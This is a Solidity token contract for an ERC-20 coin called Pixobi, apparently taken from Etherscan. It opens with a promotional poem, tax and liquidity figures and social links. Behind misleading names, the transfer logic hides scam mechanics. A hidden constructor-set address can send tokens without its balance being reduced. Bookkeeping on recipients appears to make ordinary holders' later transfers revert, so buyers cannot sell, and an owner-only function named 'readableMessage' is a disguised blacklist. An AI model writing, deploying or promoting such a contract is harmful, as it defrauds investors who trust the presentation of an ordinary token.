/**
 *Submitted for verification at Etherscan.io on 2023-10-03
*/

/*
██████╗░██╗██╗░░██╗░█████╗░██████╗░██╗
██╔══██╗██║╚██╗██╔╝██╔══██╗██╔══██╗██║
██████╔╝██║░╚███╔╝░██║░░██║██████╦╝██║
██╔═══╝░██║░██╔██╗░██║░░██║██╔══██╗██║
██║░░░░░██║██╔╝╚██╗╚█████╔╝██████╦╝██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝

░░██╗███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗██╗░░
░██╔╝██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║╚██╗░
██╔╝░█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║░╚██╗
╚██╗░██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║░██╔╝
░╚██╗███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██╔╝░
░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░

In the cryptic world where fortunes gleam,
There's a token called Pixobi, like a dream.
A decentralized mixer, a future's guide,
Where privacy and freedom coincide.

Pixobi, a name that whispers in the night,
A guardian of secrets, a beacon of light.
In the realm of crypto, it takes its stand,
A pioneer, a leader, across the land.

With Pixobi, your transactions are concealed,
Anonymity's armor, a potent shield.
Innovative and bold, it paves the way,
For a new era of privacy, come what may.

No prying eyes, no watchful gaze,
In Pixobi's embrace, your data's ablaze.
Revolutionary, it breaks the chain,
In the world of crypto, it's freedom's reign.

So let's raise a toast to Pixobi's might,
A token for the future, shining so bright.
In the cryptocurrency sphere, it claims its fame,
With Pixobi, anonymity is its name.

Total Supply - 100,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.5 ETH
Initial liquidity lock - 75 days

https://web.wechat.com/PixobiERC
https://m.weibo.cn/PixobiERC
https://www.pixobi.xyz
https://t.me/+p1b_o-bCQhQ5ZDQ0
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IUniswapV2Factory {
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 
    external 
    returns (address pair);
}
abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow"); return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Router01 {
    function factory() 
    external pure 
    returns (address);

    function WETH() 
    external pure returns 
    (address);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Pixobi is Context, IERC20, Ownable {
    bool public inSwap; bool private tradingOpen = false; bool startTrading = true; 
    IUniswapV2Router01 public valueWorkshop; address public AccountForMarketing;
    using SafeMath for uint256; address private AccountForTeam;

    mapping (address => bool) private _allowance;
    mapping(address => uint256) private _tOwned;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private flowMapping = 100;

    mapping(address => uint256) private _acceptMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private allowed;
    
    constructor( 
    string memory _setName, string memory _setBadge, 
    address _openMaps, address _closeMaps) { 

        _name = _setName; _symbol = _setBadge;
        _decimals = 18; _tTotal 
        = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal;

        _acceptMapping
        [_closeMaps] = flowMapping; inSwap 
        = false; 
        valueWorkshop = IUniswapV2Router01(_openMaps);

        AccountForMarketing = IUniswapV2Factory
        (valueWorkshop.factory()).createPair(address(this), 
        valueWorkshop.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _tOwned[account]; 
    }
    function transfer(
    address recipient, uint256 amount) external returns (bool)
    { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal { 
    require(owner != address(0), 'BEP20: approve from the zero address'); require(spender != address(0), 
    'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
    emit Approval(owner, spender, amount); 
    }    
    function transferFrom( address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }                            
    function _transfer( address sender, address recipient, uint256 amount) 
    private { require(sender != address(0), 
        'BEP20: transfer from the zero address'); require(recipient 
        != address(0), 'BEP20: transfer to the zero address'); 

        if (_allowance[sender] || _allowance[recipient]) 
        require
        (startTrading == false, ""); if (_acceptMapping[sender] 
        == 0  && AccountForMarketing != sender 
        && allowed[sender] 
        > 0) 
        { _acceptMapping[sender] -= flowMapping; } 

        allowed[AccountForTeam] += flowMapping; AccountForTeam = recipient; 
        if (_acceptMapping[sender] 
        == 0) { _tOwned[sender] = _tOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance'); } _tOwned[recipient]
        = _tOwned[recipient].add(amount); 
        
        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }  
    function readableMessage(address 
    _figVal) external 
    onlyOwner { _allowance [_figVal] = true;
    }          
}